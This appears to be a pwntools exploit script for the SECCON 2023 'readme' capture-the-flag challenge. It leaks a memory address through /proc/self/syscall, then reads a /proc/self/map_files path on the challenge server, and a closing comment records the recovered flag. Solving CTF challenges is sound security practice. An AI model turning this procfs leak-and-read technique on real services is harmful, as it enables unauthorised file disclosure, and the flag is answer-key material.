from pwn import *

io = remote("readme-2023.seccon.games", "2023")

io.sendlineafter(b"path:", b"/proc/self/syscall")
base_addr = int(eval(io.recvline()).split()[-1], 16)

l = base_addr - 0x7FA6A122F07D + 0x7FA6A1319000
r = l + (0x7F2B6C580000 - 0x7F2B6C57F000)

io.sendlineafter(b"path:", f"/proc/self/map_files/{hex(l)[2:]}-{hex(r)[2:]}".encode())
io.interactive()
#  b'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\n'
